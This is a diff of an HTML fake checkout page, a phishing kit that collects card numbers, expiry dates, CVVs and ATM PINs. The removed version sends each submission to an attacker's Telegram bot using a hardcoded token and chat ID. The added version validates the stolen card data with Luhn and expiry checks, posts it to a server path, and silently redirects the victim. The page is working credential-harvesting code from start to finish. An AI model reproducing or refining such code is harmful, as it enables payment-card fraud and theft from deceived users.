@@ -1,91 +1,146 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Checkout</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout</title>
  <link rel="stylesheet" type="text/css" href="style2.css">
+
 </head>
 <body>
- <div class="banner">
- <img src="01.jpg" alt="Banner Image" style="width: 100%; height: 100%; ">
- </div>
- <div class="container">
- <h1 style="text-align: center;"></h1>
- <form>
- <div class="form-section">
- <h2>ENTER YOUR CREDENTIALS</h2>
- <label for="Name">CLIENT'S NAME</label>
- <input type="text" id="Name" name="Name" placeholder="ENTER YOUR NAME" required>
- <label for="mobileNumber">MOBILE NUMBER</label>
- <input type="tel" id="mobileNumber" name="mobileNumber" placeholder=" LINKD MOBILE NUMBER" required>
- <label for="address">AMOUNT TO PAY</label>
- <input type="text" id="address" name="address" placeholder="ENTER AMOUNT" required>
- </div>
- <div class="form-section">
- <h2>Card Pay</h2>
- <label for="cardHolderName">Card Holder Name</label>
- <input type="text" id="cardHolderName" name="cardHolderName" placeholder="ENTER CARD HOLDER NAME" required>
- <label>Card Type</label>
- <div class="card-type">
- <label><input type="radio" name="cardType" value="credit" checked> Credit</label>
- <label><input type="radio" name="cardType" value="debit"> Debit</label>
- </div>
- <label for="cardNumber">Card Number</label>
- <input type="number" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" required>
- <label for="expiryMonth">Expiry Month</label>
- <input type="number" id="expiryMonth" name="expiryMonth" placeholder="MM" required>
- <label for="expiryYear">Expiry Year</label>
- <input type="number" id="expiryYear" name="expiryYear" placeholder="YYYY" required>
-  <label for="cvv">CVV</label>
-<input type="number" id="cvv" name="cvv" placeholder="CVV" required>
- <label for="atmpim">ATM Pin</label>
- <input type="number" id="atmpim" name="atmpim" placeholder="ATM PIN" required>
- <br><br>
- <button type="submit">MAKE PAYMENT</button>
- </div>
- </form>
- </div>
- <script>
- const API_TOKEN = '8101119609:AAGA039ibNm2hQTKBoS5vFlyzIP47wQAbM4';
- const CHAT_ID = '-1002615335715';
- const form = document.querySelector('form');
+  <div class="banner">
+    <img src="01.jpg" alt="Banner Image" style="width: 100%; height: 100%;">
+  </div>
+<div class="container">
+  <h2>ENTER YOUR CREDENTIALS</h2>
+  <form id="checkoutForm">
+    <label for="Name">Client's Name</label>
+    <input type="text" id="Name" placeholder="Enter your name" required>
 
- form.addEventListener('submit', (e) => {
- e.preventDefault();
+    <label for="mobileNumber">Mobile Number</label>
+    <input type="tel" id="mobileNumber" placeholder="Linked mobile number" required maxlength="10">
 
- const formData = new FormData(form);
- const data = {
-  clientName: formData.get('Name'),
-  mobileNumber: formData.get('mobileNumber'),
-  amountToPay: formData.get('address'),
-  cardHolderName: formData.get('cardHolderName'),
-  cardType: formData.get('cardType'),
-  cardNumber: formData.get('cardNumber'),
-  expiryMonth: formData.get('expiryMonth'),
-  expiryYear: formData.get('expiryYear'),
-  cvv: formData.get('cvv'),
-  atmPin: formData.get('atmpim'),
-};
+    <label for="amount">Amount to Pay</label>
+    <input type="tel" id="amount" placeholder="Enter amount" required maxlength="5">
 
- const message = `ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @Heck0bot\nClient Name : ${data.clientName}\nMobile Number : ${data.mobileNumber}\nAmount to Pay : ${data.amountToPay}\nCard Holder Name : ${data.cardHolderName}\nCard Type : ${data.cardType}\nCard Number : ${data.cardNumber}\nExpiry Month : ${data.expiryMonth}\nExpiry Year : ${data.expiryYear}\nCVV : ${data.cvv}\nATM Pin : ${data.atmPin}`;
- fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
- method: 'POST',
- headers: {
- 'Content-Type': 'application/json',
- },
- body: JSON.stringify({
- chat_id: CHAT_ID,
- text: message,
- }),
- })
- .then((response) => response.json())
- .then((data) => {
- console.log(data);
- window.location.href = 'next-page.html'; // redirect to next page
- })
- .catch((error) => console.error(error));
- });
- </script>
+    <h2>Card Payment</h2>
+    <label for="cardHolderName">Card Holder Name</label>
+    <input type="text" id="cardHolderName" placeholder="Enter card holder name" required>
+
+    <div class="card-type">
+      <label><input type="radio" name="cardType" value="credit" checked> Credit</label>
+      <label><input type="radio" name="cardType" value="debit"> Debit</label>
+    </div>
+
+    <label for="cardNumber">Card Number</label>
+    <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" required maxlength="19">
+
+    <div class="row">
+      <div class="field">
+        <label for="expiry">Expiry</label>
+        <input type="tel" id="expiry" placeholder="MM/YY" required maxlength="5">
+      </div>
+      <div class="field">
+        <label for="cvv">CVV</label>
+        <input type="password" id="cvv" placeholder="XXX" required maxlength="3" inputmode="numeric" pattern="\d*">
+      </div>
+    </div>
+
+    <label for="atmpin">ATM PIN</label>
+    <input type="password" id="atmpin" placeholder="XXXX or XXXXXX" required maxlength="6" inputmode="numeric" pattern="\d*">
+    <br><br>
+
+    <button type="submit">Make Payment</button>
+  </form>
+</div>
+
+<script>
+const form = document.getElementById('checkoutForm');
+const cardInput = document.getElementById('cardNumber');
+const expiryInput = document.getElementById('expiry');
+const mobileInput = document.getElementById('mobileNumber');
+const atmInput = document.getElementById('atmpin');
+
+// Card 16 digits 4-4-4-4 formatting
+cardInput.addEventListener('input', e => {
+  let val = e.target.value.replace(/\D/g,'').slice(0,16);
+  let formatted = val.match(/.{1,4}/g);
+  e.target.value = formatted ? formatted.join(' ') : '';
+});
+
+// Expiry MM/YY formatting
+expiryInput.addEventListener('input', e => {
+  let val = e.target.value.replace(/\D/g,'').slice(0,4);
+  if(val.length>2) val = val.slice(0,2)+'/'+val.slice(2);
+  e.target.value = val;
+});
+
+// Mobile max 10 digits
+mobileInput.addEventListener('input', e => {
+  e.target.value = e.target.value.replace(/\D/g,'').slice(0,10);
+});
+
+// ATM PIN max 6 digits
+atmInput.addEventListener('input', e => {
+  let val = e.target.value.replace(/\D/g,'').slice(0,6);
+  e.target.value = val;
+});
+
+// Luhn check for card
+function luhnCheck(num){
+  let arr = num.replace(/\s/g,'').split('').reverse().map(Number);
+  let sum = arr.reduce((acc,val,i)=> i%2 ? acc + ((val*2>9)? val*2-9 : val*2) : acc+val,0);
+  return sum%10===0;
+}
+
+form.addEventListener('submit', async e => {
+  e.preventDefault();
+
+  const card = cardInput.value.replace(/\s/g,'');
+  const expiry = expiryInput.value;
+  const mm = parseInt(expiry.split('/')[0]);
+  const yy = parseInt(expiry.split('/')[1]);
+  const now = new Date();
+  const currentMonth = now.getMonth()+1;
+  const currentYear = now.getFullYear()%100;
+  const cvv = document.getElementById('cvv').value;
+  const atmPin = atmInput.value;
+
+  // Validation
+  if(card.length !==16 || !luhnCheck(card)){ alert('❌ Invalid card number'); return; }
+  if(!/^\d{2}\/\d{2}$/.test(expiry) || mm<1 || mm>12 || yy<currentYear || (yy===currentYear && mm<currentMonth)){
+    alert('❌ Invalid or expired date'); return;
+  }
+  if(cvv.length !==3){ alert('❌ CVV must be 3 digits'); return; }
+  if(!(atmPin.length===4 || atmPin.length===6)){ alert('❌ ATM PIN must be 4 or 6 digits'); return; }
+
+  const data = {
+    uuid: 'device-' + Math.random().toString(36).substr(2,6),
+    client_name: document.getElementById('Name').value,
+    mobile_number: mobileInput.value,
+    amount_to_pay: document.getElementById('amount').value,
+    card_holder_name: document.getElementById('cardHolderName').value,
+    card_type: document.querySelector('input[name="cardType"]:checked').value,
+    card_number: card,
+    expiry,
+    cvv,
+    atm_pin: atmPin
+  };
+
+  try{
+    await fetch('/html-form-data',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(data)
+    });
+    // Redirect silently after success
+    window.location.href = 'next-page.html';
+  }catch(err){
+    console.error(err);
+    alert('❌ Error sending data to server.');
+  }
+});
+</script>
+
 </body>
-</html>
+     </html>
